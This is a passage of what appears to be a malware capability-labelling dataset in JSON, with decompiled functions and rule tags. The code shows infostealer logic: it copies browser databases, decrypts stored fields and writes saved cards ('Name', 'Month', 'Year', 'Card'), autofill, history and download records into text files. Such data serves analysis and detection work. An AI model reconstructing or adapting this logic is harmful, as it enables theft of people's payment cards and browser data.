        "decompiled_code": "\nvoid fcn.0040e530(void)\n\n{\n    int32_t iVar1;\n    uchar auStackY8104 [8040];\n    uint uStackY64;\n    uint arg_8h;\n    \n    fcn.0042cc70();\n    fcn.004257d0();\n    arg_8h = 1;\n    (**0x4463a4)();\n    iVar1 = (**0x44646c)();\n    if (iVar1 == 0) goto code_r0x0040e611;\n    iVar1 = (**0x446284)();\n    if (iVar1 == 0) {\n        (**0x4464ac)();\n        goto code_r0x0040e611;\n    }\n    uStackY64 = 0x40e5a9;\n    iVar1 = (**0x4462c8)();\n    if (iVar1 == 0) {\n        uStackY64 = 0x40e5d1;\n        iVar1 = (**0x4462a4)();\n        if (iVar1 != 0) goto code_r0x0040e5f7;\n        uStackY64 = 0x40e5e8;\n        fcn.00420150(&stack0xffffe058, 0, 0);\n        auStackY8104[0] = 0;\n    }\n    else {\ncode_r0x0040e5f7:\n        (**0x4464ac)();\n    }\n    (**0x4462ac)();\ncode_r0x0040e611:\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 347
    },
    "0040e70e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040e70e(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint *unaff_EDI;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = arg_8h;\n    iVar1 = (**0x4463b4)(&var_10h, 0, 0, 0, 0, 0, &var_8h);\n    if (iVar1 != 0) {\n        *unaff_EDI = var_8h;\n        arg_8h_00 = (**0x446454)(0x40, var_8h);\n        *arg_ch = arg_8h_00;\n        if (arg_8h_00 != 0) {\n            fcn.00420150(arg_8h_00, var_4h, *unaff_EDI);\n        }\n    }\n    uVar2 = (**0x446554)(var_4h);\n    return uVar2 & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 273
    },
    "0040e94c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e94c(uint param_1)\n\n{\n    uint in_EAX;\n    uint arg_8h;\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.0041e0ea(in_EAX);\n    fcn.00420150(arg_8h, param_1, in_EAX);\n    var_4h = param_1;\n    arg_8h_00 = fcn.0041e0ea(in_EAX);\n    iVar1 = (**0x4463b4)(&var_8h, 0, 0, 0, 0, 0, &var_10h);\n    if (iVar1 == 0) {\n        arg_8h_00 = 0;\n    }\n    else {\n        if (var_10h != 0) {\n            fcn.00420150(arg_8h_00, var_ch, var_10h);\n        }\n        *(var_10h + arg_8h_00) = 0;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 279
    },
    "0040e9b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0040e9b3(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint extraout_ECX;\n    int32_t iVar3;\n    char *extraout_EDX;\n    uchar *unaff_EBX;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_68h;\n    uint var_64h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    int32_t iVar7;\n    uint var_4h;\n    \n    fcn.004208fe(0x74);\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x34) = extraout_ECX;\n    iVar3 = 3;\n    *(unaff_EBP + -0x30) = extraout_EDX;\n    *(unaff_EBP + -0x38) = *(unaff_EBP + 8);\n    if (2 < *(unaff_EBP + 8)) {\n        bVar6 = true;\n        pcVar4 = extraout_EDX;\n        pcVar5 = 0x43bf14;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            bVar6 = *pcVar4 == *pcVar5;\n            pcVar4 = pcVar4 + 1;\n            pcVar5 = pcVar5 + 1;\n        } while (bVar6);\n        if (bVar6) {\n            if ((*(unaff_EBP + 0xc) == 0) || (*(unaff_EBP + -0x34) == 0)) {\n                *(unaff_EBX + 0x14) = 0xf;\n                *(unaff_EBX + 0x10) = 0;\n                *unaff_EBX = 0;\n            }\n            else {\n                fcn.004257d0(unaff_EBP + -0x80, 0, 0x40);\n                iVar3 = *(unaff_EBP + -0x30) + 3;\n                *(unaff_EBP + -0x78) = iVar3;\n                *(unaff_EBP + -0x68) = *(unaff_EBP + -0x38) + -0x13 + iVar3;\n                iVar3 = *(unaff_EBP + -0x38) + -0x1f;\n                *(unaff_EBP + -0x80) = 0x40;\n                *(unaff_EBP + -0x7c) = 1;\n                *(unaff_EBP + -0x74) = 0xc;\n                *(unaff_EBP + -100) = 0x10;\n                *(unaff_EBP + -0x30) = iVar3;\n                iVar3 = (**0x446454)(0x40, iVar3);\n                if (iVar3 != 0) {\n                    iVar7 = iVar3;\n                    iVar1 = (**0x4464f4)(*(unaff_EBP + -0x34), *(unaff_EBP + -0x74) + *(unaff_EBP + -0x78), \n                                         *(unaff_EBP + -0x30), unaff_EBP + -0x80, 0, 0, iVar3, *(unaff_EBP + -0x30), \n                                         unaff_EBP + -0x30, 0);\n                    if (-1 < iVar1) {\n                        *(unaff_EBP + -0x1c) = 0;\n                        *(unaff_EBP + -0x18) = 0xf;\n                        *(unaff_EBP + -0x2c) = 0;\n                        fcn.00403fb5(iVar3, *(unaff_EBP + -0x30));\n                        *(unaff_EBP + -4) = 0;\n                        *(unaff_EBX + 0x10) = 0;\n                        *(unaff_EBX + 0x14) = 0xf;\n                        *unaff_EBX = 0;\n                        fcn.00403f0c();\n                        fcn.00403f73(iVar7, 0, iVar3, 1);\n                        goto code_r0x0040eaef;\n                    }\n                }\n                *(unaff_EBX + 0x14) = 0xf;\n                *(unaff_EBX + 0x10) = 0;\n                *unaff_EBX = 0;\n            }\n            fcn.00403f50(\"NULL\");\n            goto code_r0x0040eaef;\n        }\n    }\n    uVar2 = fcn.0040e94c();\n    fcn.00403ed2(uVar2);\ncode_r0x0040eaef:\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1191
    },
    "0040eaf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040eaf7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_120h;\n    uint var_118h;\n    uint var_4h;\n    \n    fcn.004208fe(0x144);\n    *(unaff_EBP + -0x14c) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x148) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x150) = *(unaff_EBP + 0x14);\n    fcn.004257d0(unaff_EBP + -0x118, 0, 0x104);\n    (**0x4464ac)(unaff_EBP + -0x118, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(unaff_EBP + -0x118, uVar1);\n    (**0x446354)(extraout_ECX, unaff_EBP + -0x118, 1);\n    uVar1 = *0x445e44;\n    iVar2 = (**0x4462d0)(unaff_EBP + -0x118, unaff_EBP + -0x144);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(*(unaff_EBP + -0x144), uVar1, 0xffffffff, unaff_EBP + -0x138, 0);\n        if (iVar2 == 0) {\n            iVar2 = (**0x44629c)(*(unaff_EBP + -0x138));\n            while (iVar2 == 100) {\n                uVar1 = (**0x4462bc)(*(unaff_EBP + -0x138), 0);\n                *(unaff_EBP + -0x140) = uVar1;\n                uVar3 = (**0x4462bc)(*(unaff_EBP + -0x138), 1);\n                uVar1 = *(unaff_EBP + 0x10);\n                *(unaff_EBP + -0x13c) = uVar3;\n                uVar3 = (**0x4462a8)(*(unaff_EBP + -0x138), 2);\n                (**0x4462b0)(*(unaff_EBP + -0x138), 2);\n                fcn.0040e9b3(uVar3, uVar1);\n                *(unaff_EBP + -4) = 0;\n                iVar2 = *(unaff_EBP + -0x134);\n                if (*(unaff_EBP + -0x120) < 0x10) {\n                    iVar2 = unaff_EBP + -0x134;\n                }\n                iVar2 = (**0x4464dc)(iVar2, 0x43bd76);\n                if ((iVar2 != 0) || (iVar2 = (**0x4464dc)(*(unaff_EBP + -0x13c), 0x43bd76),  iVar2 != 0)) {\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                    (**0x4464ac)();\n                }\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00403f73(1, 0);\n                iVar2 = (**0x44629c)(*(unaff_EBP + -0x138));\n            }\n        }\n        (**0x4462a0)(*(unaff_EBP + -0x138));\n        (**0x4462d4)(*(unaff_EBP + -0x144));\n    }\n    (**0x4463b0)(unaff_EBP + -0x118);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1048
    },
    "0040ed8b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ed8b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint extraout_ECX;\n    uint extraout_EDX;\n    int32_t unaff_EBP;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_220h;\n    uint var_118h;\n    uint var_4h;\n    \n    fcn.004208fe(0x264);\n    uVar3 = *0x445dbc;\n    *(unaff_EBP + -0x248) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x26c) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x260) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x244) = extraout_ECX;\n    *(unaff_EBP + -0x268) = *(unaff_EBP + 0x14);\n    iVar2 = (**0x4464dc)(extraout_EDX, uVar3);\n    if ((iVar2 == 0) || (iVar2 = (**0x4464dc)(extraout_EDX, *0x445de0),  iVar2 == 0)) {\n        *(unaff_EBP + -0x244) = 0x43bd76;\n    }\n    else {\n        iVar2 = (**0x4464dc)(extraout_ECX, *0x4460b0);\n        if (iVar2 == 0) goto code_r0x0040f1be;\n    }\n    fcn.004257d0(unaff_EBP + -0x220, 0, 0x104);\n    (**0x4464ac)(unaff_EBP + -0x220, *0x446038);\n    uVar3 = fcn.00416673();\n    (**0x4464ac)(unaff_EBP + -0x220, uVar3);\n    (**0x446354)(*(unaff_EBP + -0x248), unaff_EBP + -0x220, 1);\n    fcn.004257d0(unaff_EBP + -0x118, 0, 0x104);\n    (**0x4464ac)(unaff_EBP + -0x118, 0x43bd7c);\n    (**0x4464ac)(unaff_EBP + -0x118, *0x4460a4);\n    (**0x4464ac)(unaff_EBP + -0x118, 0x43bd7c);\n    (**0x4464ac)(unaff_EBP + -0x118, extraout_EDX);\n    (**0x4464ac)(unaff_EBP + -0x118, 0x43e4fc);\n    (**0x4464ac)(unaff_EBP + -0x118, *(unaff_EBP + -0x244));\n    (**0x4464ac)(unaff_EBP + -0x118, \".txt\");\n    uVar3 = *0x445d4c;\n    iVar2 = (**0x4462d0)(unaff_EBP + -0x220, unaff_EBP + -0x254);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(*(unaff_EBP + -0x254), uVar3, 0xffffffff, unaff_EBP + -0x240, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x446508)(0, 999999);\n            uVar3 = (**0x446490)(uVar3);\n            *(unaff_EBP + -0x244) = uVar3;\n            iVar2 = (**0x44629c)(*(unaff_EBP + -0x240));\n            while (iVar2 == 100) {\n                uVar4 = (**0x4462bc)(*(unaff_EBP + -0x240), 0);\n                *(unaff_EBP + -0x25c) = uVar4;\n                puVar5 = (**0x4462bc)(*(unaff_EBP + -0x240), 1);\n                *(unaff_EBP + -0x250) = puVar5;\n                uVar4 = (**0x4462bc)(*(unaff_EBP + -0x240), 2);\n                *(unaff_EBP + -600) = uVar4;\n                uVar4 = (**0x4462bc)(*(unaff_EBP + -0x240), 3);\n                *(unaff_EBP + -0x24c) = uVar4;\n                uVar4 = (**0x4462bc)(*(unaff_EBP + -0x240), 4);\n                *(unaff_EBP + -0x248) = uVar4;\n                uVar4 = (**0x4462bc)(*(unaff_EBP + -0x240), 5);\n                *(unaff_EBP + -0x264) = uVar4;\n                iVar2 = (**0x4464dc)(puVar5, 0x43df58);\n                uVar4 = *0x4461a4;\n                if (iVar2 == 0) {\n                    uVar4 = *0x445da0;\n                }\n                uVar1 = *(unaff_EBP + -0x250);\n                *puVar5 = 0;\n                (**0x4464ac)(uVar1, uVar4);\n                puVar5 = *(unaff_EBP + -0x24c);\n                iVar2 = (**0x4464dc)(puVar5, 0x43df58);\n                uVar4 = *0x4461a4;\n                if (iVar2 == 0) {\n                    uVar4 = *0x445da0;\n                }\n                uVar1 = *(unaff_EBP + -0x24c);\n                *puVar5 = 0;\n                (**0x4464ac)(uVar1, uVar4);\n                puVar5 = *(unaff_EBP + -0x248);\n                if (*puVar5 == '-') {\n                    *puVar5 = 0;\n                    (**0x4464ac)(puVar5, 0x43df58);\n                }\n                (**0x4464ac)(uVar3, *(unaff_EBP + -0x25c));\n                (**0x4464ac)(uVar3, 0x43e500);\n                (**0x4464ac)(uVar3, *(unaff_EBP + -0x250));\n                (**0x4464ac)(uVar3, 0x43e500);\n                (**0x4464ac)(uVar3, *(unaff_EBP + -600));\n                (**0x4464ac)(uVar3, 0x43e500);\n                (**0x4464ac)(uVar3, *(unaff_EBP + -0x24c));\n                (**0x4464ac)(uVar3, 0x43e500);\n                (**0x4464ac)(uVar3, *(unaff_EBP + -0x248));\n                (**0x4464ac)(uVar3, 0x43e500);\n                (**0x4464ac)(uVar3, *(unaff_EBP + -0x264));\n                (**0x4464ac)(uVar3, 0x43e500);\n                uVar3 = *(unaff_EBP + -0x26c);\n                uVar4 = (**0x4462a8)(*(unaff_EBP + -0x240), 6);\n                (**0x4462b0)(*(unaff_EBP + -0x240), 6);\n                puVar5 = fcn.0040e9b3(uVar4, uVar3);\n                *(unaff_EBP + -4) = 0;\n                if (0xf < puVar5[5]) {\n                    puVar5 = *puVar5;\n                }\n                (**0x4464ac)(*(unaff_EBP + -0x244), puVar5);\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00403f73(1, 0);\n                (**0x4464ac)(*(unaff_EBP + -0x244), 0x43bd78);\n                iVar2 = (**0x44629c)(*(unaff_EBP + -0x240));\n                uVar3 = *(unaff_EBP + -0x244);\n            }\n            uVar3 = (**0x4463a4)(uVar3);\n            fcn.0041d4dc(unaff_EBP + -0x118, uVar3, 3);\n        }\n        (**0x4462a0)(*(unaff_EBP + -0x240));\n        (**0x4462d4)(*(unaff_EBP + -0x254));\n    }\n    (**0x4463b0)(unaff_EBP + -0x220);\ncode_r0x0040f1be:\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 2149
    },
    "0040f1c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040f1c6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_220h;\n    uint var_118h;\n    uint var_4h;\n    \n    fcn.004208fe(0x250);\n    *(unaff_EBP + -0x248) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x244) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x250) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -600) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x254) = *(unaff_EBP + 0x18);\n    fcn.004257d0(unaff_EBP + -0x118, 0, 0x104);\n    (**0x4464ac)(unaff_EBP + -0x118, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(unaff_EBP + -0x118, uVar1);\n    (**0x446354)(extraout_ECX, unaff_EBP + -0x118, 1);\n    fcn.004257d0(unaff_EBP + -0x220, 0, 0x104);\n    (**0x446300)(unaff_EBP + -0x220, \"\\\\CC\\\\%s_%s.txt\", *(unaff_EBP + -0x244), *(unaff_EBP + -0x248));\n    uVar1 = *0x445bf8;\n    iVar2 = (**0x4462d0)(unaff_EBP + -0x118, unaff_EBP + -0x24c);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(*(unaff_EBP + -0x24c), uVar1, 0xffffffff, unaff_EBP + -0x240, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x446508)(0, 999999);\n            uVar1 = (**0x446490)(uVar1);\n            iVar2 = (**0x44629c)(*(unaff_EBP + -0x240));\n            while (iVar2 == 100) {\n                uVar3 = (**0x4462bc)(*(unaff_EBP + -0x240), 0);\n                uVar4 = (**0x4462bc)(*(unaff_EBP + -0x240), 1);\n                *(unaff_EBP + -0x244) = uVar4;\n                uVar4 = (**0x4462bc)(*(unaff_EBP + -0x240), 2);\n                *(unaff_EBP + -0x248) = uVar4;\n                (**0x4464ac)(uVar1, \"Name: \");\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43bd78);\n                (**0x4464ac)(uVar1, \"Month: \");\n                (**0x4464ac)(uVar1, *(unaff_EBP + -0x244));\n                (**0x4464ac)(uVar1, 0x43bd78);\n                (**0x4464ac)(uVar1, \"Year: \");\n                (**0x4464ac)(uVar1, *(unaff_EBP + -0x248));\n                (**0x4464ac)(uVar1, 0x43bd78);\n                (**0x4464ac)(uVar1, \"Card: \");\n                uVar3 = *(unaff_EBP + -0x250);\n                uVar4 = (**0x4462a8)(*(unaff_EBP + -0x240), 3);\n                (**0x4462b0)(*(unaff_EBP + -0x240), 3);\n                puVar5 = fcn.0040e9b3(uVar4, uVar3);\n                *(unaff_EBP + -4) = 0;\n                if (0xf < puVar5[5]) {\n                    puVar5 = *puVar5;\n                }\n                (**0x4464ac)(uVar1, puVar5);\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00403f73(1, 0);\n                (**0x4464ac)(uVar1, 0x43e104);\n                iVar2 = (**0x44629c)(*(unaff_EBP + -0x240));\n            }\n            uVar1 = (**0x4463a4)(uVar1);\n            fcn.0041d4dc(unaff_EBP + -0x220, uVar1, 3);\n        }\n        (**0x4462a0)(*(unaff_EBP + -0x240));\n        (**0x4462d4)(*(unaff_EBP + -0x24c));\n    }\n    (**0x4463b0)(unaff_EBP + -0x118);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1295
    },
    "0040f478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f478(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_110h, 0, 0x104);\n    (**0x4464ac)(&var_110h, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(&var_110h, uVar1);\n    arg_8h_00 = &var_110h;\n    (**0x446354)();\n    fcn.004257d0(&var_218h, 0, 0x104);\n    (**0x446300)(&var_218h, \"\\\\Autofill\\\\%s_%s.txt\", arg_ch, arg_8h);\n    uVar1 = *0x44615c;\n    iVar2 = (**0x4462d0)(&var_110h, &var_220h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(var_220h, uVar1, 0xffffffff, &var_21ch, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x446508)(0, 999999);\n            uVar1 = (**0x446490)(uVar1);\n            while( true ) {\n                iVar2 = (**0x44629c)(var_21ch);\n                if (iVar2 != 100) break;\n                uVar3 = (**0x4462bc)(var_21ch, 0);\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43e1b0);\n                uVar3 = (**0x4462bc)(var_21ch, 1);\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43bd78);\n            }\n            uVar1 = (**0x4463a4)(uVar1);\n            fcn.0041d4dc(&var_218h, uVar1, 3);\n        }\n        (**0x4462a0)(var_21ch);\n        (**0x4462d4)(var_220h);\n    }\n    (**0x4463b0)(&var_110h);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 655
    },
    "0040f637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f637(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_110h, 0, 0x104);\n    (**0x4464ac)(&var_110h, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(&var_110h, uVar1);\n    arg_8h_00 = &var_110h;\n    (**0x446354)();\n    fcn.004257d0(&var_218h, 0, 0x104);\n    (**0x446300)(&var_218h, \"\\\\History\\\\%s_%s.txt\", arg_ch, arg_8h);\n    iVar2 = (**0x4462d0)(&var_110h, &var_220h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(var_220h, *0x445e6c, 0xffffffff, &var_21ch, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x446508)(0, 999999);\n            uVar1 = (**0x446490)(uVar1);\n            while( true ) {\n                iVar2 = (**0x44629c)(var_21ch);\n                if (iVar2 != 100) break;\n                (**0x4462bc)(var_21ch, 0);\n                uVar3 = (**0x4462bc)(var_21ch, 0);\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43bd78);\n            }\n            uVar1 = (**0x4463a4)(uVar1);\n            fcn.0041d4dc(&var_218h, uVar1, 3);\n        }\n        (**0x4462a0)(var_21ch);\n        (**0x4462d4)(var_220h);\n    }\n    (**0x4463b0)(&var_110h);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 604
    },
    "0040f7db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f7db(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_220h = arg_ch;\n    fcn.004257d0(&var_110h, 0, 0x104);\n    (**0x4464ac)(&var_110h, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(&var_110h, uVar1);\n    arg_8h_00 = 1;\n    (**0x446354)();\n    fcn.004257d0(&var_218h, 0, 0x104);\n    (**0x446300)(&var_218h, \"\\\\Downloads\\\\%s_%s.txt\", var_220h, arg_8h);\n    uVar1 = *0x44620c;\n    iVar2 = (**0x4462d0)(&var_110h, &var_224h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(var_224h, uVar1, 0xffffffff, &var_21ch, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x446508)(0, 999999);\n            uVar1 = (**0x446490)(uVar1);\n            while( true ) {\n                iVar2 = (**0x44629c)(var_21ch);\n                if (iVar2 != 100) break;\n                uVar3 = (**0x4462bc)(var_21ch, 0);\n                var_220h = (**0x4462bc)(var_21ch, 1);\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43bd78);\n                (**0x4464ac)(uVar1, var_220h);\n                (**0x4464ac)(uVar1, 0x43e104);\n            }\n            uVar1 = (**0x4463a4)(uVar1);\n            fcn.0041d4dc(&var_218h, uVar1, 3);\n        }\n        (**0x4462a0)(var_21ch);\n        (**0x4462d4)(var_224h);\n    }\n    (**0x4463b0)(&var_110h);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 661
    },
    "0040f9aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f9aa(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint in_stack_fffffee0;\n    uchar auStack268 [108];\n    uchar auStack160 [152];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack160;\n    iVar1 = fcn.0041ed83(0x446288);\n    if (iVar1 < 0x20) {\n        fcn.004257d0(auStack268, 0, 0x104);\n        (**0x4464ac)(auStack268, param_1);\n        (**0x4464ac)(auStack268, 0x43bd7c);\n        (**0x4464ac)(auStack268, *0x446258);\n        iVar1 = (**0x446340)(auStack268, 0x80000000, 1, 0, 3, 0, 0);\n        if (iVar1 != 0) {\n            (**0x44635c)(iVar1, 0, 0, 2);\n            iVar2 = (**0x44651c)(iVar1, 0);\n            (**0x44635c)(iVar1, 0, 0, 0);\n            uVar3 = fcn.0041d661(iVar2 + 1);\n            (**0x446468)(iVar1, uVar3, iVar2, &stack0xfffffee0, 0);\n            for (iVar2 = (**0x44632c)(uVar3, *0x445b7c); iVar2 != 0; iVar2 = (**0x44632c)(iVar2 + -2, *0x445b7c)) {\n                iVar4 = (**0x4463a4)(*0x445b7c);\n                iVar2 = (**0x44632c)(iVar2 + 3 + iVar4, *0x445dd4);\n                *(iVar2 + -3) = 0;\n                (**0x4464ac)();\n                (**0x4464ac)();\n                (**0x4464ac)();\n                (**0x4464ac)();\n                (**0x4464ac)();\n                (**0x4464ac)();\n                (**0x4464ac)();\n                iVar2 = (**0x44632c)(iVar2 + -2, *0x446014);\n                iVar4 = (**0x4463a4)(*0x446014);\n                iVar2 = (**0x44632c)(iVar2 + 3 + iVar4, *0x446010);\n                *(iVar2 + -3) = 0;\n                (**0x4464ac)();\n                fcn.0040e530();\n                (**0x4464ac)();\n                (**0x4464ac)();\n                iVar2 = (**0x44632c)(iVar2 + -2, *0x446010);\n                iVar4 = (**0x4463a4)(*0x446010);\n                iVar2 = (**0x44632c)(iVar2 + 3 + iVar4, *0x44618c);\n                *(iVar2 + -3) = 0;\n                (**0x4464ac)();\n                fcn.0040e530();\n                (**0x4464ac)();\n                (**0x4464ac)();\n            }\n            (**0x446344)(iVar1);\n        }\n        (**0x4462d8)();\n    }\n    fcn.0041e0a1(in_stack_fffffee0);\n    return;\n}\n",
        "token_count": 786
    },
    "0040fc0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
